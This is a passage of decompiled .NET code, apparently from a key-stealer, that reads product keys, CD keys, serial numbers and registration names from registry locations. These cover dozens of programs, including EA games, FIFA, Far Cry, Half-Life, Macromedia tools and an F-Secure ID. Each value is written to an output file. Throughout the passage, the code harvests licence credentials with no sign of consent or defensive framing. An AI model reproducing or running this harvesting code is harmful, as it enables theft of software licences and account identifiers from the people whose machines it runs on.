					IL_1699:
					num = 330;
					streamWriter.WriteLine("The Battle for Middle-earth II : " + text56);
					goto IL_16b3;
					IL_16b3:
					num = 331;
					streamWriter.Flush();
					goto IL_16c1;
					IL_16c1:
					num = 332;
					streamWriter.WriteLine("");
					goto IL_16d4;
					IL_16d4:
					num = 333;
					streamWriter.Flush();
					goto IL_16e2;
					IL_16e2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_16ea;
					IL_16ea:
					num = 335;
					text57 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2", "ergc", null));
					goto IL_1708;
					IL_1708:
					num = 336;
					streamWriter.WriteLine("The Sims 2 : " + text57);
					goto IL_1722;
					IL_1722:
					num = 337;
					streamWriter.Flush();
					goto IL_1730;
					IL_1730:
					num = 338;
					streamWriter.WriteLine("");
					goto IL_1743;
					IL_1743:
					num = 339;
					streamWriter.Flush();
					goto IL_1751;
					IL_1751:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1759;
					IL_1759:
					num = 341;
					text58 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University", "ergc", null));
					goto IL_1777;
					IL_1777:
					num = 342;
					streamWriter.WriteLine("The Sims 2 University : " + text58);
					goto IL_1791;
					IL_1791:
					num = 343;
					streamWriter.Flush();
					goto IL_179f;
					IL_179f:
					num = 344;
					streamWriter.WriteLine("");
					goto IL_17b2;
					IL_17b2:
					num = 345;
					streamWriter.Flush();
					goto IL_17c0;
					IL_17c0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_17c8;
					IL_17c8:
					num = 347;
					text59 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife", "ergc", null));
					goto IL_17e6;
					IL_17e6:
					num = 348;
					streamWriter.WriteLine("The Sims 2 Nightlife : " + text59);
					goto IL_1800;
					IL_1800:
					num = 349;
					streamWriter.Flush();
					goto IL_180e;
					IL_180e:
					num = 350;
					streamWriter.WriteLine("");
					goto IL_1821;
					IL_1821:
					num = 351;
					streamWriter.Flush();
					goto IL_182f;
					IL_182f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1837;
					IL_1837:
					num = 353;
					text60 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open For Business", "ergc", null));
					goto IL_1855;
					IL_1855:
					num = 354;
					streamWriter.WriteLine("The Sims 2 Open For Business : " + text60);
					goto IL_186f;
					IL_186f:
					num = 355;
					streamWriter.Flush();
					goto IL_187d;
					IL_187d:
					num = 356;
					streamWriter.WriteLine("");
					goto IL_1890;
					IL_1890:
					num = 357;
					streamWriter.Flush();
					goto IL_189e;
					IL_189e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_18a6;
					IL_18a6:
					num = 359;
					text61 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Pets", "ergc", null));
					goto IL_18c4;
					IL_18c4:
					num = 360;
					streamWriter.WriteLine("The Sims 2 Pets : " + text61);
					goto IL_18de;
					IL_18de:
					num = 361;
					streamWriter.Flush();
					goto IL_18ec;
					IL_18ec:
					num = 362;
					streamWriter.WriteLine("");
					goto IL_18ff;
					IL_18ff:
					num = 363;
					streamWriter.Flush();
					goto IL_190d;
					IL_190d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1915;
					IL_1915:
					num = 365;
					text62 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Seasons", "ergc", null));
					goto IL_1933;
					IL_1933:
					num = 366;
					streamWriter.WriteLine("The Sims 2 Seasons : " + text62);
					goto IL_194d;
					IL_194d:
					num = 367;
					streamWriter.Flush();
					goto IL_195b;
					IL_195b:
					num = 368;
					streamWriter.WriteLine("");
					goto IL_196e;
					IL_196e:
					num = 369;
					streamWriter.Flush();
					goto IL_197c;
					IL_197c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1984;
					IL_1984:
					num = 371;
					text63 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff", "ergc", null));
					goto IL_19a2;
					IL_19a2:
					num = 372;
					streamWriter.WriteLine("The Sims 2 Glamour Life Stuff : " + text63);
					goto IL_19bc;
					IL_19bc:
					num = 373;
					streamWriter.Flush();
					goto IL_19ca;
					IL_19ca:
					num = 374;
					streamWriter.WriteLine("");
					goto IL_19dd;
					IL_19dd:
					num = 375;
					streamWriter.Flush();
					goto IL_19eb;
					IL_19eb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_19f3;
					IL_19f3:
					num = 377;
					text64 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Celebration Stuff", "ergc", null));
					goto IL_1a11;
					IL_1a11:
					num = 378;
					streamWriter.WriteLine("The Sims 2 Celebration Stuff : " + text64);
					goto IL_1a2b;
					IL_1a2b:
					num = 379;
					streamWriter.Flush();
					goto IL_1a39;
					IL_1a39:
					num = 380;
					streamWriter.WriteLine("");
					goto IL_1a4c;
					IL_1a4c:
					num = 381;
					streamWriter.Flush();
					goto IL_1a5a;
					IL_1a5a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1a62;
					IL_1a62:
					num = 383;
					text65 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 H M Fashion Stuff", "ergc", null));
					goto IL_1a80;
					IL_1a80:
					num = 384;
					streamWriter.WriteLine("The Sims 2 H M Fashion Stuff : " + text65);
					goto IL_1a9a;
					IL_1a9a:
					num = 385;
					streamWriter.Flush();
					goto IL_1aa8;
					IL_1aa8:
					num = 386;
					streamWriter.WriteLine("");
					goto IL_1abb;
					IL_1abb:
					num = 387;
					streamWriter.Flush();
					goto IL_1ac9;
					IL_1ac9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1ad1;
					IL_1ad1:
					num = 389;
					text66 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff", "ergc", null));
					goto IL_1aef;
					IL_1aef:
					num = 390;
					streamWriter.WriteLine("The Sims 2 Family Fun Stuff : " + text66);
					goto IL_1b09;
					IL_1b09:
					num = 391;
					streamWriter.Flush();
					goto IL_1b17;
					IL_1b17:
					num = 392;
					streamWriter.WriteLine("");
					goto IL_1b2a;
					IL_1b2a:
					num = 393;
					streamWriter.Flush();
					goto IL_1b38;
					IL_1b38:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1b40;
					IL_1b40:
					num = 395;
					text67 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Name", null));
					goto IL_1b5e;
					IL_1b5e:
					num = 396;
					streamWriter.WriteLine("DVD Audio Extractor (Name) : " + text67);
					goto IL_1b78;
					IL_1b78:
					num = 397;
					streamWriter.Flush();
					goto IL_1b86;
					IL_1b86:
					num = 398;
					streamWriter.WriteLine("");
					goto IL_1b99;
					IL_1b99:
					num = 399;
					streamWriter.Flush();
					goto IL_1ba7;
					IL_1ba7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1baf;
					IL_1baf:
					num = 401;
					text68 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Number", null));
					goto IL_1bcd;
					IL_1bcd:
					num = 402;
					streamWriter.WriteLine("DVD Audio Extractor (Serial) : " + text68);
					goto IL_1be7;
					IL_1be7:
					num = 403;
					streamWriter.Flush();
					goto IL_1bf5;
					IL_1bf5:
					num = 404;
					streamWriter.WriteLine("");
					goto IL_1c08;
					IL_1c08:
					num = 405;
					streamWriter.Flush();
					goto IL_1c16;
					IL_1c16:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1c1e;
					IL_1c1e:
					num = 407;
					text69 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\Empire Earth II", "CDKey", null));
					goto IL_1c3c;
					IL_1c3c:
					num = 408;
					streamWriter.WriteLine("Empire Earth II : " + text69);
					goto IL_1c56;
					IL_1c56:
					num = 409;
					streamWriter.Flush();
					goto IL_1c64;
					IL_1c64:
					num = 410;
					streamWriter.WriteLine("");
					goto IL_1c77;
					IL_1c77:
					num = 411;
					streamWriter.Flush();
					goto IL_1c85;
					IL_1c85:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1c8d;
					IL_1c8d:
					num = 413;
					text70 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "fear", null));
					goto IL_1cab;
					IL_1cab:
					num = 414;
					streamWriter.WriteLine("F.E.A.R : " + text70);
					goto IL_1cc5;
					IL_1cc5:
					num = 415;
					streamWriter.Flush();
					goto IL_1cd3;
					IL_1cd3:
					num = 416;
					streamWriter.WriteLine("");
					goto IL_1ce6;
					IL_1ce6:
					num = 417;
					streamWriter.Flush();
					goto IL_1cf4;
					IL_1cf4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1cfc;
					IL_1cfc:
					num = 419;
					text71 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\F-Secure\\BackWeb\\iLauncher", "UID", null));
					goto IL_1d1a;
					IL_1d1a:
					num = 420;
					streamWriter.WriteLine("F-Secure : " + text71);
					goto IL_1d34;
					IL_1d34:
					num = 421;
					streamWriter.Flush();
					goto IL_1d42;
					IL_1d42:
					num = 422;
					streamWriter.WriteLine("");
					goto IL_1d55;
					IL_1d55:
					num = 423;
					streamWriter.Flush();
					goto IL_1d63;
					IL_1d63:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1d6b;
					IL_1d6b:
					num = 425;
					text72 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM", "CDKey", null));
					goto IL_1d89;
					IL_1d89:
					num = 426;
					streamWriter.WriteLine("FARCRY : " + text72);
					goto IL_1da3;
					IL_1da3:
					num = 427;
					streamWriter.Flush();
					goto IL_1db1;
					IL_1db1:
					num = 428;
					streamWriter.WriteLine("");
					goto IL_1dc4;
					IL_1dc4:
					num = 429;
					streamWriter.Flush();
					goto IL_1dd2;
					IL_1dd2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1dda;
					IL_1dda:
					num = 431;
					text73 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY2\\UBI.COM", "CDKey", null));
					goto IL_1df8;
					IL_1df8:
					num = 432;
					streamWriter.WriteLine("FARCRY 2 : " + text73);
					goto IL_1e12;
					IL_1e12:
					num = 433;
					streamWriter.Flush();
					goto IL_1e20;
					IL_1e20:
					num = 434;
					streamWriter.WriteLine("");
					goto IL_1e33;
					IL_1e33:
					num = 435;
					streamWriter.Flush();
					goto IL_1e41;
					IL_1e41:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1e49;
					IL_1e49:
					num = 437;
					text74 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002", "ergc", null));
					goto IL_1e67;
					IL_1e67:
					num = 438;
					streamWriter.WriteLine("FIFA 2002 : " + text74);
					goto IL_1e81;
					IL_1e81:
					num = 439;
					streamWriter.Flush();
					goto IL_1e8f;
					IL_1e8f:
					num = 440;
					streamWriter.WriteLine("");
					goto IL_1ea2;
					IL_1ea2:
					num = 441;
					streamWriter.Flush();
					goto IL_1eb0;
					IL_1eb0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1eb8;
					IL_1eb8:
					num = 443;
					text75 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003", "ergc", null));
					goto IL_1ed6;
					IL_1ed6:
					num = 444;
					streamWriter.WriteLine("FIFA 2003 : " + text75);
					goto IL_1ef0;
					IL_1ef0:
					num = 445;
					streamWriter.Flush();
					goto IL_1efe;
					IL_1efe:
					num = 446;
					streamWriter.WriteLine("");
					goto IL_1f11;
					IL_1f11:
					num = 447;
					streamWriter.Flush();
					goto IL_1f1f;
					IL_1f1f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1f27;
					IL_1f27:
					num = 449;
					text76 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2004", "ergc", null));
					goto IL_1f45;
					IL_1f45:
					num = 450;
					streamWriter.WriteLine("FIFA 2004 : " + text76);
					goto IL_1f5f;
					IL_1f5f:
					num = 451;
					streamWriter.Flush();
					goto IL_1f6d;
					IL_1f6d:
					num = 452;
					streamWriter.WriteLine("");
					goto IL_1f80;
					IL_1f80:
					num = 453;
					streamWriter.Flush();
					goto IL_1f8e;
					IL_1f8e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1f96;
					IL_1f96:
					num = 455;
					text77 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2005", "ergc", null));
					goto IL_1fb4;
					IL_1fb4:
					num = 456;
					streamWriter.WriteLine("FIFA 2005 : " + text77);
					goto IL_1fce;
					IL_1fce:
					num = 457;
					streamWriter.Flush();
					goto IL_1fdc;
					IL_1fdc:
					num = 458;
					streamWriter.WriteLine("");
					goto IL_1fef;
					IL_1fef:
					num = 459;
					streamWriter.Flush();
					goto IL_1ffd;
					IL_1ffd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2005;
					IL_2005:
					num = 461;
					text78 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 07", "ergc", null));
					goto IL_2023;
					IL_2023:
					num = 462;
					streamWriter.WriteLine("FIFA 07 : " + text78);
					goto IL_203d;
					IL_203d:
					num = 463;
					streamWriter.Flush();
					goto IL_204b;
					IL_204b:
					num = 464;
					streamWriter.WriteLine("");
					goto IL_205e;
					IL_205e:
					num = 465;
					streamWriter.Flush();
					goto IL_206c;
					IL_206c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2074;
					IL_2074:
					num = 467;
					text79 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\FIFA 08", "ergc", null));
					goto IL_2092;
					IL_2092:
					num = 468;
					streamWriter.WriteLine("FIFA 08 : " + text79);
					goto IL_20ac;
					IL_20ac:
					num = 469;
					streamWriter.Flush();
					goto IL_20ba;
					IL_20ba:
					num = 470;
					streamWriter.WriteLine("");
					goto IL_20cd;
					IL_20cd:
					num = 471;
					streamWriter.Flush();
					goto IL_20db;
					IL_20db:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_20e3;
					IL_20e3:
					num = 473;
					text80 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force", "ergc", null));
					goto IL_2101;
					IL_2101:
					num = 474;
					streamWriter.WriteLine("Freedom Force : " + text80);
					goto IL_211b;
					IL_211b:
					num = 475;
					streamWriter.Flush();
					goto IL_2129;
					IL_2129:
					num = 476;
					streamWriter.WriteLine("");
					goto IL_213c;
					IL_213c:
					num = 477;
					streamWriter.Flush();
					goto IL_214a;
					IL_214a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2152;
					IL_2152:
					num = 479;
					text81 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War Beta", "ProductKey", null));
					goto IL_2170;
					IL_2170:
					num = 480;
					streamWriter.WriteLine("Frontlines Fuel of War Beta : " + text81);
					goto IL_218a;
					IL_218a:
					num = 481;
					streamWriter.Flush();
					goto IL_2198;
					IL_2198:
					num = 482;
					streamWriter.WriteLine("");
					goto IL_21ab;
					IL_21ab:
					num = 483;
					streamWriter.Flush();
					goto IL_21b9;
					IL_21b9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_21c1;
					IL_21c1:
					num = 485;
					text82 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War", "ProductKey", null));
					goto IL_21df;
					IL_21df:
					num = 486;
					streamWriter.WriteLine("Frontlines: Fuel of War : " + text82);
					goto IL_21f9;
					IL_21f9:
					num = 487;
					streamWriter.Flush();
					goto IL_2207;
					IL_2207:
					num = 488;
					streamWriter.WriteLine("");
					goto IL_221a;
					IL_221a:
					num = 489;
					streamWriter.Flush();
					goto IL_2228;
					IL_2228:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2230;
					IL_2230:
					num = 491;
					text83 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight", "GRcode", null));
					goto IL_224e;
					IL_224e:
					num = 492;
					streamWriter.WriteLine("GetRight : " + text83);
					goto IL_2268;
					IL_2268:
					num = 493;
					streamWriter.Flush();
					goto IL_2276;
					IL_2276:
					num = 494;
					streamWriter.WriteLine("");
					goto IL_2289;
					IL_2289:
					num = 495;
					streamWriter.Flush();
					goto IL_2297;
					IL_2297:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_229f;
					IL_229f:
					num = 497;
					text84 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations", "ergc", null));
					goto IL_22bd;
					IL_22bd:
					num = 498;
					streamWriter.WriteLine("Global Operations : " + text84);
					goto IL_22d7;
					IL_22d7:
					num = 499;
					streamWriter.Flush();
					goto IL_22e5;
					IL_22e5:
					num = 500;
					streamWriter.WriteLine("");
					goto IL_22f8;
					IL_22f8:
					num = 501;
					streamWriter.Flush();
					goto IL_2306;
					IL_2306:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_230e;
					IL_230e:
					num = 503;
					text85 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Gunman", "Settings", null));
					goto IL_232c;
					IL_232c:
					num = 504;
					streamWriter.WriteLine("Gunman : " + text85);
					goto IL_2346;
					IL_2346:
					num = 505;
					streamWriter.Flush();
					goto IL_2354;
					IL_2354:
					num = 506;
					streamWriter.WriteLine("");
					goto IL_2367;
					IL_2367:
					num = 507;
					streamWriter.Flush();
					goto IL_2375;
					IL_2375:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_237d;
					IL_237d:
					num = 509;
					text86 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Setting", "pYrTgbzWFEpYpYrT", null));
					goto IL_239b;
					IL_239b:
					num = 510;
					streamWriter.WriteLine("Half-Life : " + text86);
					goto IL_23b5;
					IL_23b5:
					num = 511;
					streamWriter.Flush();
					goto IL_23c3;
					IL_23c3:
					num = 512;
					streamWriter.WriteLine("");
					goto IL_23d6;
					IL_23d6:
					num = 513;
					streamWriter.Flush();
					goto IL_23e4;
					IL_23e4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_23ec;
					IL_23ec:
					num = 515;
					text87 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Hellgate: London", "ergc", null));
					goto IL_240a;
					IL_240a:
					num = 516;
					streamWriter.WriteLine("Hellgate London : " + text87);
					goto IL_2424;
					IL_2424:
					num = 517;
					streamWriter.Flush();
					goto IL_2432;
					IL_2432:
					num = 518;
					streamWriter.WriteLine("");
					goto IL_2445;
					IL_2445:
					num = 519;
					streamWriter.Flush();
					goto IL_2453;
					IL_2453:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_245b;
					IL_245b:
					num = 521;
					text88 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key", null));
					goto IL_2479;
					IL_2479:
					num = 522;
					streamWriter.WriteLine("Hidden & Dangerous 2 : " + text88);
					goto IL_2493;
					IL_2493:
					num = 523;
					streamWriter.Flush();
					goto IL_24a1;
					IL_24a1:
					num = 524;
					streamWriter.WriteLine("");
					goto IL_24b4;
					IL_24b4:
					num = 525;
					streamWriter.Flush();
					goto IL_24c2;
					IL_24c2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_24ca;
					IL_24ca:
					num = 527;
					text89 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey", null));
					goto IL_24e8;
					IL_24e8:
					num = 528;
					streamWriter.WriteLine("IGI 2 Retail : " + text89);
					goto IL_2502;
					IL_2502:
					num = 529;
					streamWriter.Flush();
					goto IL_2510;
					IL_2510:
					num = 530;
					streamWriter.WriteLine("");
					goto IL_2523;
					IL_2523:
					num = 531;
					streamWriter.Flush();
					goto IL_2531;
					IL_2531:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2539;
					IL_2539:
					num = 533;
					text90 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "License", null));
					goto IL_2557;
					IL_2557:
					num = 534;
					streamWriter.WriteLine("InCD Serial : " + text90);
					goto IL_2571;
					IL_2571:
					num = 535;
					streamWriter.Flush();
					goto IL_257f;
					IL_257f:
					num = 536;
					streamWriter.WriteLine("");
					goto IL_2592;
					IL_2592:
					num = 537;
					streamWriter.Flush();
					goto IL_25a0;
					IL_25a0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_25a8;
					IL_25a8:
					num = 539;
					text91 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JoWooD\\InstalledGames\\IG2", "prvkey", null));
					goto IL_25c6;
					IL_25c6:
					num = 540;
					streamWriter.WriteLine("IG2 : " + text91);
					goto IL_25e0;
					IL_25e0:
					num = 541;
					streamWriter.Flush();
					goto IL_25ee;
					IL_25ee:
					num = 542;
					streamWriter.WriteLine("");
					goto IL_2601;
					IL_2601:
					num = 543;
					streamWriter.Flush();
					goto IL_260f;
					IL_260f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2617;
					IL_2617:
					num = 545;
					text92 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "Registration Code", null));
					goto IL_2635;
					IL_2635:
					num = 546;
					streamWriter.WriteLine("iPod Converter (Registration Code) : " + text92);
					goto IL_264f;
					IL_264f:
					num = 547;
					streamWriter.Flush();
					goto IL_265d;
					IL_265d:
					num = 548;
					streamWriter.WriteLine("");
					goto IL_2670;
					IL_2670:
					num = 549;
					streamWriter.Flush();
					goto IL_267e;
					IL_267e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2686;
					IL_2686:
					num = 551;
					text93 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "User Name", null));
					goto IL_26a4;
					IL_26a4:
					num = 552;
					streamWriter.WriteLine("iPod Converter (User Name) : " + text93);
					goto IL_26be;
					IL_26be:
					num = 553;
					streamWriter.Flush();
					goto IL_26cc;
					IL_26cc:
					num = 554;
					streamWriter.WriteLine("");
					goto IL_26df;
					IL_26df:
					num = 555;
					streamWriter.Flush();
					goto IL_26ed;
					IL_26ed:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_26f5;
					IL_26f5:
					num = 557;
					text94 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire", "ergc", null));
					goto IL_2713;
					IL_2713:
					num = 558;
					streamWriter.WriteLine("James Bond 007 Nightfire : " + text94);
					goto IL_272d;
					IL_272d:
					num = 559;
					streamWriter.Flush();
					goto IL_273b;
					IL_273b:
					num = 560;
					streamWriter.WriteLine("");
					goto IL_274e;
					IL_274e:
					num = 561;
					streamWriter.Flush();
					goto IL_275c;
					IL_275c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2764;
					IL_2764:
					num = 563;
					text95 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\3d0\\Status Legends of Might and Magic", "CustomerNumber", null));
					goto IL_2782;
					IL_2782:
					num = 564;
					streamWriter.WriteLine("Status Legends of Might and Magic : " + text95);
					goto IL_279c;
					IL_279c:
					num = 565;
					streamWriter.Flush();
					goto IL_27aa;
					IL_27aa:
					num = 566;
					streamWriter.WriteLine("");
					goto IL_27bd;
					IL_27bd:
					num = 567;
					streamWriter.Flush();
					goto IL_27cb;
					IL_27cb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_27d3;
					IL_27d3:
					num = 569;
					text96 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Flash\\7\\Registration", "Serial Number", null));
					goto IL_27f1;
					IL_27f1:
					num = 570;
					streamWriter.WriteLine("Macromedia Flash 7 : " + text96);
					goto IL_280b;
					IL_280b:
					num = 571;
					streamWriter.Flush();
					goto IL_2819;
					IL_2819:
					num = 572;
					streamWriter.WriteLine("");
					goto IL_282c;
					IL_282c:
					num = 573;
					streamWriter.Flush();
					goto IL_283a;
					IL_283a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2842;
					IL_2842:
					num = 575;
					text97 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Fireworks\\7\\Registration", "Serial Number", null));
					goto IL_2860;
					IL_2860:
					num = 576;
					streamWriter.WriteLine("Macromedia Fireworks 7 : " + text97);
					goto IL_287a;
					IL_287a:
					num = 577;
					streamWriter.Flush();
					goto IL_2888;
					IL_2888:
					num = 578;
					streamWriter.WriteLine("");
					goto IL_289b;
					IL_289b:
					num = 579;
					streamWriter.Flush();
					goto IL_28a9;
					IL_28a9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_28b1;
					IL_28b1:
					num = 581;
					text98 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Dreamweaver\\7\\Registration", "Serial Number", null));
					goto IL_28cf;
					IL_28cf:
					num = 582;
					streamWriter.WriteLine("Macromedia Dreamweaver 7 : " + text98);
					goto IL_28e9;
					IL_28e9:
					num = 583;
					streamWriter.Flush();
					goto IL_28f7;
					IL_28f7:
					num = 584;
					streamWriter.WriteLine("");
					goto IL_290a;
					IL_290a:
					num = 585;
					streamWriter.Flush();
					goto IL_2918;
					IL_2918:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2920;
					IL_2920:
					num = 587;
					text99 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Madden NFL 07", "ergc", null));
					goto IL_293e;
					IL_293e:
					num = 588;
					streamWriter.WriteLine("Madden NFL 07 : " + text99);
					goto IL_2958;
					IL_2958:
					num = 589;
					streamWriter.Flush();
					goto IL_2966;
					IL_2966:
					num = 590;
					streamWriter.WriteLine("");
					goto IL_2979;
					IL_2979:
					num = 591;
					streamWriter.Flush();
					goto IL_2987;
					IL_2987:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_298f;
					IL_298f:
					num = 593;
					text100 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JSG\\Matrix Saver V2", "Registration", null));
					goto IL_29ad;
					IL_29ad:
					num = 594;
					streamWriter.WriteLine("Matrix Screensave : " + text100);
					goto IL_29c7;
					IL_29c7:
					num = 595;
					streamWriter.Flush();
					goto IL_29d5;
					IL_29d5:
					num = 596;
					streamWriter.WriteLine("");
					goto IL_29e8;
					IL_29e8:
					num = 597;
					streamWriter.Flush();
					goto IL_29f6;
					IL_29f6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_29fe;
					IL_29fe:
					num = 599;
					text101 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault", "ergc", null));
					goto IL_2a1c;
					IL_2a1c:
					num = 600;
					streamWriter.WriteLine("Medal of Honor: Airborne : " + text101);
					goto IL_2a36;
					IL_2a36:
					num = 601;
					streamWriter.Flush();
					goto IL_2a44;
					IL_2a44:
					num = 602;
					streamWriter.WriteLine("");
					goto IL_2a57;
					IL_2a57:
					num = 603;
					streamWriter.Flush();
					goto IL_2a65;
					IL_2a65:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2a6d;
					IL_2a6d:
					num = 605;
					text102 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough", "ergc", null));
					goto IL_2a8b;
